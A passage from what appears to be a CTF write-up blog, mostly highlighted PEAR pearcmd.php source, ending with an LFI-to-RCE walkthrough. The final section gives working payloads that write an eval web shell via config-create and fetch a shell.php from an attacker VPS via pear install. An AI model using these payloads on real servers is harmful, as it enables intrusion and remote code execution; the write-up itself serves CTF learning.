class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&#x27;verbose&#x27;</span>) - <span class="hljs-number">1</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;V&#x27;</span>:<br>        <span class="hljs-title function_ invoke__">usage</span>(<span class="hljs-literal">null</span>, <span class="hljs-string">&#x27;version&#x27;</span>);<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;c&#x27;</span>:<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;C&#x27;</span>:<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">default</span>:<br>        <span class="hljs-comment">// all non pear params goes to the command</span><br>        <span class="hljs-variable">$cmdopts</span>[<span class="hljs-variable">$opt</span>[<span class="hljs-number">0</span>]] = <span class="hljs-variable">$param</span>;<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$store_system_config</span>) &#123;<br>    <span class="hljs-variable">$config</span>-&gt;<span class="hljs-title function_ invoke__">store</span>(<span class="hljs-string">&#x27;system&#x27;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$store_user_config</span>) &#123;<br>    <span class="hljs-variable">$config</span>-&gt;<span class="hljs-title function_ invoke__">store</span>(<span class="hljs-string">&#x27;user&#x27;</span>);<br>&#125;<br><br><span class="hljs-variable">$command</span> = (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$options</span>[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>])) ? <span class="hljs-variable">$options</span>[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>] : <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$command</span>) &amp;&amp; (<span class="hljs-variable">$store_user_config</span> || <span class="hljs-variable">$store_system_config</span>)) &#123;<br>    <span class="hljs-keyword">exit</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$fetype</span> == <span class="hljs-string">&#x27;Gtk2&#x27;</span>) &#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$config</span>-&gt;<span class="hljs-title function_ invoke__">validConfiguration</span>()) &#123;<br>        PEAR::<span class="hljs-title function_ invoke__">raiseError</span>(<br>            <span class="hljs-string">&quot;CRITICAL ERROR: no existing valid configuration files found in &quot;</span> .<br>            <span class="hljs-string">&quot;files &#x27;<span class="hljs-subst">$pear_user_config</span>&#x27; or &#x27;<span class="hljs-subst">$pear_system_config</span>&#x27;, &quot;</span> .<br>            <span class="hljs-string">&quot;please copy an existing configuration file to one of these &quot;</span> .<br>            <span class="hljs-string">&quot;locations, or use the -c and -s options to create one&quot;</span><br>        );<br>    &#125;<br>    <span class="hljs-title class_">Gtk</span>::<span class="hljs-title function_ invoke__">main</span>();<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">do</span> &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$command</span> == <span class="hljs-string">&#x27;help&#x27;</span>) &#123;<br>            <span class="hljs-title function_ invoke__">usage</span>(<span class="hljs-literal">null</span>, <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$options</span>[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>]) ? <span class="hljs-variable">$options</span>[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] : <span class="hljs-literal">null</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$config</span>-&gt;<span class="hljs-title function_ invoke__">validConfiguration</span>()) &#123;<br>            PEAR::<span class="hljs-title function_ invoke__">raiseError</span>(<br>                <span class="hljs-string">&quot;CRITICAL ERROR: no existing valid configuration files found &quot;</span> .<br>                <span class="hljs-string">&quot;in files &#x27;<span class="hljs-subst">$pear_user_config</span>&#x27; or &#x27;<span class="hljs-subst">$pear_system_config</span>&#x27;, &quot;</span> .<br>                <span class="hljs-string">&quot;please copy an existing configuration file to one of &quot;</span> .<br>                <span class="hljs-string">&quot;these locations, or use the -c and -s options to create one&quot;</span><br>            );<br>        &#125;<br><br>        PEAR::<span class="hljs-title function_ invoke__">pushErrorHandling</span>(PEAR_ERROR_RETURN);<br>        <span class="hljs-variable">$cmd</span> = <span class="hljs-title class_">PEAR_Command</span>::<span class="hljs-title function_ invoke__">factory</span>(<span class="hljs-variable">$command</span>, <span class="hljs-variable">$config</span>);<br>        PEAR::<span class="hljs-title function_ invoke__">popErrorHandling</span>();<br>        <span class="hljs-keyword">if</span> (PEAR::<span class="hljs-title function_ invoke__">isError</span>(<span class="hljs-variable">$cmd</span>)) &#123;<br>            <span class="hljs-title function_ invoke__">usage</span>(<span class="hljs-literal">null</span>, <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$options</span>[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>]) ? <span class="hljs-variable">$options</span>[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>] : <span class="hljs-literal">null</span>);<br>        &#125;<br><br>        <span class="hljs-variable">$short_args</span> = <span class="hljs-variable">$long_args</span> = <span class="hljs-literal">null</span>;<br>        <span class="hljs-title class_">PEAR_Command</span>::<span class="hljs-title function_ invoke__">getGetoptArgs</span>(<span class="hljs-variable">$command</span>, <span class="hljs-variable">$short_args</span>, <span class="hljs-variable">$long_args</span>);<br>        <span class="hljs-title function_ invoke__">array_shift</span>(<span class="hljs-variable">$options</span>[<span class="hljs-number">1</span>]);<br>        <span class="hljs-variable">$tmp</span> = <span class="hljs-title class_">Console_Getopt</span>::<span class="hljs-title function_ invoke__">getopt2</span>(<span class="hljs-variable">$options</span>[<span class="hljs-number">1</span>], <span class="hljs-variable">$short_args</span>, <span class="hljs-variable">$long_args</span>);<br><br>        <span class="hljs-keyword">if</span> (PEAR::<span class="hljs-title function_ invoke__">isError</span>(<span class="hljs-variable">$tmp</span>)) &#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">list</span>(<span class="hljs-variable">$tmpopt</span>, <span class="hljs-variable">$params</span>) = <span class="hljs-variable">$tmp</span>;<br>        <span class="hljs-variable">$opts</span> = <span class="hljs-keyword">array</span>();<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$tmpopt</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$foo</span> =&gt; <span class="hljs-variable">$tmp2</span>) &#123;<br>            <span class="hljs-keyword">list</span>(<span class="hljs-variable">$opt</span>, <span class="hljs-variable">$value</span>) = <span class="hljs-variable">$tmp2</span>;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$value</span> === <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-variable">$value</span> = <span class="hljs-literal">true</span>; <span class="hljs-comment">// options without args</span><br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$opt</span>) == <span class="hljs-number">1</span>) &#123;<br>                <span class="hljs-variable">$cmdoptions</span> = <span class="hljs-variable">$cmd</span>-&gt;<span class="hljs-title function_ invoke__">getOptions</span>(<span class="hljs-variable">$command</span>);<br>                <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$cmdoptions</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$o</span> =&gt; <span class="hljs-variable">$d</span>) &#123;<br>                    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$d</span>[<span class="hljs-string">&#x27;shortopt&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$d</span>[<span class="hljs-string">&#x27;shortopt&#x27;</span>] == <span class="hljs-variable">$opt</span>) &#123;<br>                        <span class="hljs-variable">$opts</span>[<span class="hljs-variable">$o</span>] = <span class="hljs-variable">$value</span>;<br>                    &#125;<br>                &#125;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$opt</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>) == <span class="hljs-string">&#x27;--&#x27;</span>) &#123;<br>                    <span class="hljs-variable">$opts</span>[<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$opt</span>, <span class="hljs-number">2</span>)] = <span class="hljs-variable">$value</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-variable">$ok</span> = <span class="hljs-variable">$cmd</span>-&gt;<span class="hljs-title function_ invoke__">run</span>(<span class="hljs-variable">$command</span>, <span class="hljs-variable">$opts</span>, <span class="hljs-variable">$params</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$ok</span> === <span class="hljs-literal">false</span>) &#123;<br>            PEAR::<span class="hljs-title function_ invoke__">raiseError</span>(<span class="hljs-string">&quot;unknown command `<span class="hljs-subst">$command</span>&#x27;&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (PEAR::<span class="hljs-title function_ invoke__">isError</span>(<span class="hljs-variable">$ok</span>)) &#123;<br>            PEAR::<span class="hljs-title function_ invoke__">setErrorHandling</span>(<br>                PEAR_ERROR_CALLBACK, <span class="hljs-keyword">array</span>(<span class="hljs-variable">$ui</span>, <span class="hljs-string">&quot;displayFatalError&quot;</span>)<br>            );<br>            PEAR::<span class="hljs-title function_ invoke__">raiseError</span>(<span class="hljs-variable">$ok</span>);<br>        &#125;<br>    &#125; <span class="hljs-keyword">while</span> (<span class="hljs-literal">false</span>);<br>&#125;<br><br><span class="hljs-comment">// &#123;&#123;&#123; usage()</span><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Display usage information</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> mixed $error       Optional error message</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> mixed $helpsubject Optional subject/command to display help for</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@return</span> void</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">usage</span>(<span class="hljs-params"><span class="hljs-variable">$error</span> = <span class="hljs-literal">null</span>, <span class="hljs-variable">$helpsubject</span> = <span class="hljs-literal">null</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$progname</span>, <span class="hljs-variable">$all_commands</span>;<br>    <span class="hljs-variable">$stdout</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&#x27;php://stdout&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>);<br>    <span class="hljs-keyword">if</span> (PEAR::<span class="hljs-title function_ invoke__">isError</span>(<span class="hljs-variable">$error</span>)) &#123;<br>        <span class="hljs-title function_ invoke__">fputs</span>(<span class="hljs-variable">$stdout</span>, <span class="hljs-variable">$error</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>() . <span class="hljs-string">&quot;\n&quot;</span>);<br>    &#125; <span class="hljs-keyword">elseif</span> (<span class="hljs-variable">$error</span> !== <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-title function_ invoke__">fputs</span>(<span class="hljs-variable">$stdout</span>, <span class="hljs-string">&quot;<span class="hljs-subst">$error</span>\n&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$helpsubject</span> != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-variable">$put</span> = <span class="hljs-title function_ invoke__">cmdHelp</span>(<span class="hljs-variable">$helpsubject</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$put</span> = <span class="hljs-string">&quot;Commands:\n&quot;</span>;<br>        <span class="hljs-variable">$maxlen</span> = <span class="hljs-title function_ invoke__">max</span>(<span class="hljs-title function_ invoke__">array_map</span>(<span class="hljs-string">&quot;strlen&quot;</span>, <span class="hljs-variable">$all_commands</span>));<br>        <span class="hljs-variable">$formatstr</span> = <span class="hljs-string">&quot;%-<span class="hljs-subst">&#123;$maxlen&#125;</span>s  %s\n&quot;</span>;<br>        <span class="hljs-title function_ invoke__">ksort</span>(<span class="hljs-variable">$all_commands</span>);<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$all_commands</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$cmd</span> =&gt; <span class="hljs-variable">$class</span>) &#123;<br>            <span class="hljs-variable">$put</span> .= <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-variable">$formatstr</span>, <span class="hljs-variable">$cmd</span>, <span class="hljs-title class_">PEAR_Command</span>::<span class="hljs-title function_ invoke__">getDescription</span>(<span class="hljs-variable">$cmd</span>));<br>        &#125;<br>        <span class="hljs-variable">$put</span> .=<br>            <span class="hljs-string">&quot;Usage: <span class="hljs-subst">$progname</span> [options] command [command-options] &lt;parameters&gt;\n&quot;</span>.<br>            <span class="hljs-string">&quot;Type \&quot;<span class="hljs-subst">$progname</span> help options\&quot; to list all options.\n&quot;</span>.<br>            <span class="hljs-string">&quot;Type \&quot;<span class="hljs-subst">$progname</span> help shortcuts\&quot; to list all command shortcuts.\n&quot;</span>.<br>            <span class="hljs-string">&quot;Type \&quot;<span class="hljs-subst">$progname</span> help version\&quot; or &quot;</span>.<br>            <span class="hljs-string">&quot;\&quot;<span class="hljs-subst">$progname</span> version\&quot; to list version information.\n&quot;</span>.<br>            <span class="hljs-string">&quot;Type \&quot;<span class="hljs-subst">$progname</span> help &lt;command&gt;\&quot; to get the help &quot;</span>.<br>            <span class="hljs-string">&quot;for the specified command.&quot;</span>;<br>    &#125;<br>    <span class="hljs-title function_ invoke__">fputs</span>(<span class="hljs-variable">$stdout</span>, <span class="hljs-string">&quot;<span class="hljs-subst">$put</span>\n&quot;</span>);<br>    <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$stdout</span>);<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$error</span> === <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Return help string for specified command</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> string $command Command to return help for</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@return</span> void</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">cmdHelp</span>(<span class="hljs-params"><span class="hljs-variable">$command</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$progname</span>, <span class="hljs-variable">$all_commands</span>, <span class="hljs-variable">$config</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$command</span> == <span class="hljs-string">&quot;options&quot;</span>) &#123;<br>        <span class="hljs-keyword">return</span><br>        <span class="hljs-string">&quot;Options:\n&quot;</span>.<br>        <span class="hljs-string">&quot;     -v         increase verbosity level (default 1)\n&quot;</span>.<br>        <span class="hljs-string">&quot;     -q         be quiet, decrease verbosity level\n&quot;</span>.<br>        <span class="hljs-string">&quot;     -c file    find user configuration in `file&#x27;\n&quot;</span>.<br>        <span class="hljs-string">&quot;     -C file    find system configuration in `file&#x27;\n&quot;</span>.<br>        <span class="hljs-string">&quot;     -d foo=bar set user config variable `foo&#x27; to `bar&#x27;\n&quot;</span>.<br>        <span class="hljs-string">&quot;     -D foo=bar set system config variable `foo&#x27; to `bar&#x27;\n&quot;</span>.<br>        <span class="hljs-string">&quot;     -G         start in graphical (Gtk) mode\n&quot;</span>.<br>        <span class="hljs-string">&quot;     -s         store user configuration\n&quot;</span>.<br>        <span class="hljs-string">&quot;     -S         store system configuration\n&quot;</span>.<br>        <span class="hljs-string">&quot;     -u foo     unset `foo&#x27; in the user configuration\n&quot;</span>.<br>        <span class="hljs-string">&quot;     -h, -?     display help/usage (this message)\n&quot;</span>.<br>        <span class="hljs-string">&quot;     -V         version information\n&quot;</span>;<br>    &#125; <span class="hljs-keyword">elseif</span> (<span class="hljs-variable">$command</span> == <span class="hljs-string">&quot;shortcuts&quot;</span>) &#123;<br>        <span class="hljs-variable">$sc</span> = <span class="hljs-title class_">PEAR_Command</span>::<span class="hljs-title function_ invoke__">getShortcuts</span>();<br>        <span class="hljs-variable">$ret</span> = <span class="hljs-string">&quot;Shortcuts:\n&quot;</span>;<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$sc</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$s</span> =&gt; <span class="hljs-variable">$c</span>) &#123;<br>            <span class="hljs-variable">$ret</span> .= <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;     %-8s %s\n&quot;</span>, <span class="hljs-variable">$s</span>, <span class="hljs-variable">$c</span>);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$ret</span>;<br><br>    &#125; <span class="hljs-keyword">elseif</span> (<span class="hljs-variable">$command</span> == <span class="hljs-string">&quot;version&quot;</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;PEAR Version: &quot;</span>.<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;pear_package_version&#x27;</span>].<br>               <span class="hljs-string">&quot;\nPHP Version: &quot;</span>.<span class="hljs-title function_ invoke__">phpversion</span>().<br>               <span class="hljs-string">&quot;\nZend Engine Version: &quot;</span>.<span class="hljs-title function_ invoke__">zend_version</span>().<br>               <span class="hljs-string">&quot;\nRunning on: &quot;</span>.<span class="hljs-title function_ invoke__">php_uname</span>();<br><br>    &#125; <span class="hljs-keyword">elseif</span> (<span class="hljs-variable">$help</span> = <span class="hljs-title class_">PEAR_Command</span>::<span class="hljs-title function_ invoke__">getHelp</span>(<span class="hljs-variable">$command</span>)) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$help</span>)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;<span class="hljs-subst">$progname</span> <span class="hljs-subst">$command</span> [options] <span class="hljs-subst">$help</span>\n&quot;</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$help</span>[<span class="hljs-number">1</span>] === <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;<span class="hljs-subst">$progname</span> <span class="hljs-subst">$command</span> <span class="hljs-subst">$help</span>[0]&quot;</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;<span class="hljs-subst">$progname</span> <span class="hljs-subst">$command</span> [options] <span class="hljs-subst">$help</span>[0]\n<span class="hljs-subst">$help</span>[1]&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Command &#x27;<span class="hljs-subst">$command</span>&#x27; is not valid, try &#x27;<span class="hljs-subst">$progname</span> help&#x27;&quot;</span>;<br>&#125;<br><br><span class="hljs-comment">// &#125;&#125;&#125;</span><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * error_handler</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> mixed $errno  Error number</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> mixed $errmsg Message</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> mixed $file   Filename</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> mixed $line   Line number</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@access</span> public</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@return</span> boolean</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">error_handler</span>(<span class="hljs-params"><span class="hljs-variable">$errno</span>, <span class="hljs-variable">$errmsg</span>, <span class="hljs-variable">$file</span>, <span class="hljs-variable">$line</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$errno</span> &amp; E_STRICT) &#123;<br>        <span class="hljs-keyword">return</span>; <span class="hljs-comment">// E_STRICT</span><br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$errno</span> &amp; E_DEPRECATED) &#123;<br>        <span class="hljs-keyword">return</span>; <span class="hljs-comment">// E_DEPRECATED</span><br>    &#125;<br>    <span class="hljs-keyword">if</span> (!(<span class="hljs-title function_ invoke__">error_reporting</span>() &amp; <span class="hljs-variable">$errno</span>) &amp;&amp;<br>        <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;config&#x27;</span>]) &amp;&amp;<br>        <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;config&#x27;</span>]-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&#x27;verbose&#x27;</span>) &lt; <span class="hljs-number">4</span><br>    ) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>; <span class="hljs-comment">// @silenced error, show all if debug is high enough</span><br>    &#125;<br>    <span class="hljs-variable">$errortype</span> = <span class="hljs-keyword">array</span> (<br>        E_DEPRECATED  =&gt; <span class="hljs-string">&#x27;Deprecated Warning&#x27;</span>,<br>        E_ERROR   =&gt;  <span class="hljs-string">&quot;Error&quot;</span>,<br>        E_WARNING   =&gt;  <span class="hljs-string">&quot;Warning&quot;</span>,<br>        E_PARSE   =&gt;  <span class="hljs-string">&quot;Parsing Error&quot;</span>,<br>        E_STRICT  =&gt; <span class="hljs-string">&#x27;Strict Warning&#x27;</span>,<br>        E_NOTICE   =&gt;  <span class="hljs-string">&quot;Notice&quot;</span>,<br>        E_CORE_ERROR  =&gt;  <span class="hljs-string">&quot;Core Error&quot;</span>,<br>        E_CORE_WARNING  =&gt;  <span class="hljs-string">&quot;Core Warning&quot;</span>,<br>        E_COMPILE_ERROR  =&gt;  <span class="hljs-string">&quot;Compile Error&quot;</span>,<br>        E_COMPILE_WARNING =&gt;  <span class="hljs-string">&quot;Compile Warning&quot;</span>,<br>        E_USER_ERROR =&gt;  <span class="hljs-string">&quot;User Error&quot;</span>,<br>        E_USER_WARNING =&gt;  <span class="hljs-string">&quot;User Warning&quot;</span>,<br>        E_USER_NOTICE =&gt;  <span class="hljs-string">&quot;User Notice&quot;</span><br>    );<br>    <span class="hljs-variable">$prefix</span> = <span class="hljs-variable">$errortype</span>[<span class="hljs-variable">$errno</span>];<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$_PEAR_PHPDIR</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$file</span>, <span class="hljs-variable">$_PEAR_PHPDIR</span>)) &#123;<br>        <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$file</span>, <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$_PEAR_PHPDIR</span>) + <span class="hljs-number">1</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$file</span>);<br>    &#125;<br>    <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;\n<span class="hljs-subst">$prefix</span>: <span class="hljs-subst">$errmsg</span> in <span class="hljs-subst">$file</span> on line <span class="hljs-subst">$line</span>\n&quot;</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Local variables:</span><br><span class="hljs-comment"> * tab-width: 4</span><br><span class="hljs-comment"> * c-basic-offset: 4</span><br><span class="hljs-comment"> * indent-tabs-mode: nil</span><br><span class="hljs-comment"> * mode: php</span><br><span class="hljs-comment"> * End:</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">// vim600:syn=php</span><br><br></code></pre></td></tr></table></figure></details><p>切过去看看，可以看到<code>register_argc_argv</code>是开启的</p><p><img src="/posts/29460/image-20231026125928324.png" alt="image-20231026125928324"></p><p>这时候就可以利用<code>$_SERVER[‘argv’]</code>来传递命令给<code>pearcmd</code></p><h3 id="config-create"><a href="#config-create" class="headerlink" title="config-create"></a>config-create</h3><p><code>?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=@eval($_GET[0]);?&gt;+/tmp/shell.php</code></p><p>浏览器访问行不通，<code>&lt;</code>，<code>&gt;</code>会被<code>urlencode</code></p><p><img src="/posts/29460/image-20231026133801572.png" alt="image-20231026133801572"></p><p>所以使用Burp拦截修改提交的参数</p><p><img src="/posts/29460/image-20231026134010084.png" alt="image-20231026134010084"></p><p>接着蚁剑连接就行了（<del>其实有时候，我更喜欢用<code>$_GET</code>，懒得开蚁剑</del></p><p><img src="/posts/29460/image-20231026134042781.png" alt="image-20231026134042781"></p><h3 id="install（出网"><a href="#install（出网" class="headerlink" title="install（出网"></a>install（出网</h3><p>在自己vps上开个端口，写个shell，这里用的<code>$_GET</code></p><p><img src="/posts/29460/image-20231026134439674.png" alt="image-20231026134439674"></p><ul><li><p><code>?+install+--installroot+&amp;file=/usr/local/lib/php/pearcmd.php&amp;+http://[host]:[port]/shell.php</code></p><p><img src="/posts/29460/image-20231026134628923.png" alt="image-20231026134628923"></p><p>可以看到shell被保存在了<code>/var/www/html/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/tmp/pear/download/shell.php</code></p><p>但是貌似读不到（压根没写进去？</p><blockquote><p>参考中这样解释的：</p><blockquote><p>&amp;file&#x3D;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;pearcmd.php&amp;&#x2F;tmp&#x2F;pear&#x2F;download&#x2F;路径下面，这里我在使用的时候会遇到一些有关配置方面的问题，因为名为&amp;file&#x3D;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;pearcmd.php&amp;的文件夹是新创建的，而我并没有权限对其进行写操作而导致利用失败。</p></blockquote></blockquote></li><li><p><code>?file=/usr/local/lib/php/pearcmd.php&amp;+install+-R+/tmp+http://[host]:[port]/shell.php</code></p><p><img src="/posts/29460/image-20231026135720181.png" alt="image-20231026135720181"></p><p>可以看到shell被保存到了<code>/tmp/tmp/pear/download/shell.php</code></p><p>这次就可以读了</p><p><img src="/posts/29460/image-20231026140047638.png" alt="image-20231026140047638"></p></li></ul><p><em><strong><center><font color="#81ecec" size="5">viking{shui_bu_zhao_naozibaozhale}</font></center></strong></em></p><h1 id="Bin"><a href="#Bin" class="headerlink" title="Bin"></a>Bin</h1>]]></content>
    
    
    
    <tags>
      
      <tag>CTF-Recruits</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
